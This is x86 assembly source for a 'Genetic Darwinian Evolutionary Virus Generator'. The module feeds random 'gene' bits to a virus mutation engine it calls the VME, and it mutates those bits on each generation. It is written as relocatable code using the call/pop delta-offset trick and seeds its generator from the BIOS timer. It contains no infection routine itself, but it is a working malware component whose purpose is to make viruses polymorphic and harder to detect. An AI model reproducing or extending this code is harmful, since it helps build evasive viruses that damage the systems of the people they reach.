;Genetic Darwinian Evolutionary Virus Generator

.model tiny
.code
.386

        PUBLIC  INIT_GENE               ;Set up GENE
        PUBLIC  GET_RANDOM              ;Get bits from GENE
        PUBLIC  INIT_GENETIC            ;Initialize genetic subsystem, mutate

GSIZE           EQU     100H                    ;gene size

;The generator is defined by the equation
;
;              X(N+1) = (A*X(N) + C) mod M
;
;where the constants are defined as
;
M               DD      134217729
A               DD      44739244
C               DD      134217727
RAND_SEED       DD      0
GENE            DB      GSIZE dup (0AFH);GSIZE byte gene
GENE_IDX        DW      0               ;points to current loc in gene (bits)

;Set RAND_SEED up with a random number to seed the pseudo-random number
;generator. This routine should preserve all registers! it must be totally
;relocatable!
INIT_GENE       PROC    NEAR
                push    si
                push    ds
                push    dx
                push    cx
                push    bx
                push    ax
                call    RS1
RS1:            pop     bx
                sub     bx,OFFSET RS1
                xor     ax,ax
                mov     ds,ax
                mov     si,46CH
                lodsd
                mov     ecx,eax
                in      al,40H
                shl     eax,24
                xor     ecx,eax
                mov     eax,ecx
                xor     edx,edx
                mov     ecx,M
                div     ecx
                push    cs
                pop     ds
                mov     [bx][RAND_SEED],edx             ;set seed
                xor     cx,cx
                mov     cl,al
RSL1:           call    GET_RAND                        ;iterate call random # of times
                loop    RSL1
                mov     si,OFFSET GENE
                mov     cx,GSIZE/2
RSLOOP:         call    GET_RAND                        ;initialize GENE
                mov     [bx][si],ax                     ;with random numbers
                inc     si
                inc     si
                loop    RSLOOP
                pop     ax
                pop     bx
                pop     cx
                pop     dx
                pop     ds
                pop     si
                retn

INIT_GENE       ENDP

;Create a pseudo-random number and put it in ax.
GET_RAND:
                push    bx
                push    cx
                push    dx
                call    GR1
GR1:            pop     bx
                sub     bx,OFFSET GR1
                mov     eax,[bx][RAND_SEED]
                mov     ecx,[bx][A]                         ;multiply
                mul     ecx
                add     eax,[bx][C]                         ;add
                adc     edx,0
                mov     ecx,[bx][M]
                div     ecx                                 ;divide
                mov     eax,edx                             ;remainder in ax
                mov     [bx][RAND_SEED],eax                 ;and save for next round
                pop     dx
                pop     cx
                pop     bx
                retn

;This is passed the number of bits to get from the gene in al, and it returns
;those genetic bits in ax. Maximum number returned is 16. The only reason this
;is called GET_RANDOM is to maintain compatibility with the VME. It must preserve
;all registers except ax.
GET_RANDOM      PROC    NEAR
                push    bx
                push    cx
                push    dx
                push    si
                call    GRM1
GRM1:           pop     bx
                sub     bx,OFFSET GRM1
                mov     dl,al
                mov     ax,[bx][GENE_IDX]
                mov     cl,al
                and     cl,7                    ;cl=bit index
                shr     ax,3                    ;ax=byte index
                mov     si,OFFSET GENE
                add     si,ax                   ;si --> byte in gene
                mov     eax,[bx][si]            ;get requested bits in eax
                shr     eax,cl                  ;and maybe some more (now in ax)
                xor     dh,dh
                add     [bx][GENE_IDX],dx       ;update index
                cmp     [bx][GENE_IDX],8*GSIZE - 16 ;too big?
                jc      GRM2                    ;nope
                mov     [bx][GENE_IDX],0        ;else adjust by looping
GRM2:           mov     cx,dx
                push    cx
                ror     eax,cl                  ;put wanted bits high
                and     eax,0FFFF0000H          ;mask unwanted bits
                pop     cx
                rol     eax,cl                  ;put wanted back to ax
                pop     si
                pop     dx
                pop     cx
                pop     bx
                ret

GET_RANDOM      ENDP

INIT_GENETIC    PROC    NEAR
                push    bx
                call    IG1
IG1:            pop     bx
                sub     bx,OFFSET IG1
                mov     [bx][GENE_IDX],0                ;initialize ptr into GENE
                call    MUTATE                          ;mutate the gene
                pop     bx
                ret

INIT_GENETIC    ENDP

;The following generates a random 1-bit mutation at the rate specified in
;MUT_RATE.

MUT_RATE        DB      100H / 2                        ;one in 2 mutation rate

MUTATE:
                push    ax
                push    bx
                call    MUT1
MUT1:           pop     bx
                sub     bx,OFFSET MUT1
                in      al,40H                          ;get a random byte
                cmp     [bx][MUT_RATE],al               ;should we mutate
                jc      MUTR                            ;nope, just exit
                push    cx
                push    dx
                push    si
                push    ds
                xor     ax,ax
                mov     ds,ax
                mov     si,46CH                         ;get time
                lodsd
                pop     ds
                mov     [bx][RAND_SEED],eax             ;seed rand # generator
                call    GET_RAND
                mov     cx,8*GSIZE
                xor     dx,dx
                div     cx
                mov     ax,dx
                mov     cx,8
                xor     dx,dx
                div     cx                              ;ax=byte to toggle, dx=bit
                mov     cl,dl
                dec     cl                              ;cl=bits to rotate
                mov     si,ax
                add     si,OFFSET GENE                  ;byte to toggle
                mov     al,1
                shl     al,cl
                xor     [bx][si],al                     ;toggle it
                pop     si
                pop     dx
                pop     cx
MUTR:           pop     bx
                pop     ax
                ret

                END
